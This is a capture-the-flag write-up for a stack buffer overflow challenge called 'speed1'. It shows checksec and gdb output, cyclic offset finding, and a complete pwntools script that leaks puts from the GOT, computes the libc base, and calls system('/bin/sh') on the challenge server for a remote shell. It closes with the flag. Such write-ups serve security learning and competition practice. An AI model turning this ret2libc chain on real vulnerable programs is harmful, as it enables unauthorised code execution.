```
$ checksec ./speed1
[*] '~/speed1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```
$ cyclic -n 8 100  
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

```
$ gdb ./speed1
entry
break fgets
c
```

![return address is 0x6161616161616166](speed-return-address.png)

```
$ cyclic -n 8 -l 0x6161616161616166
40
```


![main address was 0x4010d0](main-address.png)


Using pwndbg to see the GOT entries:

![puts is in got](got-functions.png)


```python
#!/usr/bin/env python3

import os
from pwn import *
import pwnlib.elf

context.log_level = 'debug'
c = remote('speed-01.hfsc.tf',61000)
#c = process('./speed1')
# break: 0x40124d
# c = gdb.debug(['./speed1'], gdbscript='''
#         b *0x40124d
#         c
# ''')
libc = ELF('libc.so.6')
e = ELF('./speed1')

context.binary = e
context.os = 'linux'
context.arch = 'amd64'
rop = ROP(e)

c.recvuntil('b0fz:')

# padding for buffer overflow
rop.raw("A" * 40)
rop.puts(e.got['puts'])
rop.call(0x4010d0) # address of main/entrypoint
print(rop.dump())

info("Stage 1, leaking puts@libc address")
c.sendline(rop.chain())
leakedPuts = c.recvline()[:8].strip()

leakedPuts = int.from_bytes(leakedPuts, byteorder='little')
success(f'Leaked puts: {leakedPuts:x}')
libc.address = leakedPuts - libc.symbols['puts']
info(f"Libc Address: {libc.address:x}")

info("Stage 2, ret2shell")
c.recvuntil('b0fz:')
rop2 = ROP(libc)
rop2.call(rop.find_gadget(['ret']))
rop2.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])

padding = (b"A"*40)
payload = b"".join([padding, rop2.chain()])
c.sendline(payload)
c.interactive()
```


![the flag was midnight{b3ee4fd1e8b331a237b234395d1ad0a0}](got-flag.png)
